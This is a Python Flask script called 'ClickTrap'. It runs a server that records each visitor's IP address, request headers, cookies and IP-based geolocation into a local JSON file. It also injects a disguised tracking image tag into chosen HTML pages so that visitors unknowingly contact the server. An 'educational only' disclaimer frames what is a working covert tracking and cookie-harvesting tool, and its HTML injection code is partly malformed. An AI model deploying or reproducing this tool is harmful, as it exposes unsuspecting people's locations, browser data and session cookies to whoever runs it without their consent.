"""
ClickTrap
Educational project for learning Flask, Python, and data capture.

⚠️ DISCLAIMER: This script is intended for educational purposes only.
It is NOT designed for malicious use. Do not use it for phishing or illegal activities.
"""

from flask import Flask
from flask import request
from datetime import datetime
import sys
import requests
import json


def load_data():
    with open('.data.json', 'r') as file:
        data = json.load(file)
    return data

def save_data(data):
    with open('.data.json', 'w') as file:
        json.dump(data, file, indent=4)

def captured_date():
    date_ = datetime.now()
    date_ = date_.date()
    return str(date_)

def data_ip(ip):
    response = requests.get(f'http://ip-api.com/json/{ip}')
    local_ip = response.json()
    if local_ip["status"] == "success":
        data_all = []
        data_all.append(local_ip["regionName"])
        data_all.append(local_ip["city"])
        data_all.append(local_ip["lat"])
        data_all.append(local_ip["lon"])
        return data_all

    else:
        return ["", "", "", ""]

def server(host_, port_):
    app = Flask(__name__)

    @app.route('/', methods=['GET'])
    def main():
        user_data = {
            'date': '',
            'ip': '',
            'cookies': '',
            'headers': '',
            'local': '',
            'latitude-longetude': ''
        }

        user_data['date'] = captured_date()
        user_data['ip'] = request.remote_addr
        user_data['headers'] = dict(request.headers)
        user_data['cookies'] = request.cookies

        all_ip = data_ip(request.remote_addr)
        user_data["latitude-longetude"] = f'{all_ip[2]} {all_ip[3]}'
        user_data["local"] = f'{all_ip[0]} / {all_ip[1]}'

        data = load_data()
        data['data-captured'].append(user_data)
        save_data(data)
        print(f'\n\033[1m{"—"*10}\033[41m\033[32m CAPTURED [ {user_data["ip"]} ]\033[m\n')
        return ''

    try:
        app.run(
            debug=True,
            host=host_,
            port=port_
        )

    except KeyboardInterrupt:
        print()
        exit(0)

    except OSError as e:
        print(f'\nERROR STARTING THE SERVER: {e}\n')

def interpreter(commands):
    if commands[0] == '--help' or commands[0] == '-h':
        print('''
Usage: python main.py [OPTIONS]

Options:
  -h, --help            Show this help message and exit
  -c, --config HOST PORT
                        Save configuration with host and port
  -s, --server          Run the server with saved configuration
  -sf, --set-file FILE URL
                        Insert a <link> tag into the specified .html file
                        linking to the given URL

Description:
  Educational project built with Flask for testing data capture
  and HTML modification. NOT designed for malicious use.

Examples:
  python main.py -c 0.0.0.0 8080
  python main.py -s
  python main.py -sf your/file/index.html https://spy-site-example.com/
''')
    elif commands[0] == '--config' or commands[0] == '-c':
        if len(commands) < 3:
            print('LACK OF ARGUMENTS')
            exit(0)

        data = load_data()
        data['host'] = commands[1]
        data['port'] = int(commands[2])
        save_data(data)
        print(f'DATA SAVED.\nHOST > {commands[1]}\nPORT > {commands[2]}')
        exit(0)

    elif commands[0] == '--server' or commands[0] == '-s':
        data = load_data()
        server(data['host'], data['port'])

    elif commands[0] == '--set-file' or commands[0] == '-sf':
        if len(commands) < 3:
            print('LACK OF ARGUMENTS')
            exit(0)

        file_type = commands[1]
        file_type = file_type[len(file_type)-5:]
        if file_type != '.html':
            print('THIS FILE IS NOT .html')
            exit(0)
        try:
            with open(commands[1], 'r') as file:
                code_html = file.read()

        except FileNotFoundError:
            print('ERROR OPENING THE FILE')
            exit(0)

        code = f'<img class="font-style" src="{commands[2]}">'
        if '<head' in code_html:
            code_html = code_html.replace('<head', f"<head>\n    {code}\n</")

        else:
            code_html = f'<heade>\n    {code}\n</head>\n{code_html}'

        with open(commands[1], 'w') as file:
             file.write(code_html)
        print('STAPLED FILE')
        exit(0)

    elif commands[0] == '--list' or commands[0] == '-l':
        data = load_data()
        for user in data["data-captured"]:
            try: user_agent = user["headers"]["User-Agent"]
            except KeyError: user_agent = ''
            ngt = '\033[1m' #negrito
            null = '\033[m' #remove all modifi
            print(f'''{ngt}{"—"*35}
DATA       |{null} {user["date"]}
{ngt}IP         |{null} {user["ip"]}
{ngt}USER AGENT |{null} {user_agent}
{ngt}COOKIES    |{null} {user["cookies"]}
{ngt}LOCAL      |{null} {user["local"]}
{ngt}region     |{null} {user["latitude-longetude"]}
''')
    elif commands[0] == '--reset' or commands[0] == '-r':
        data = load_data()
        data["data-captured"] = []
        save_data(data)
        print('RESETED')

#.gg/adm0448
if __name__ == '__main__':
    commands = sys.argv[:]
    if len(commands) < 2:
        print('WRITE -h FOR HELP IN COMMANDS')
    else:
        interpreter(commands[1:])
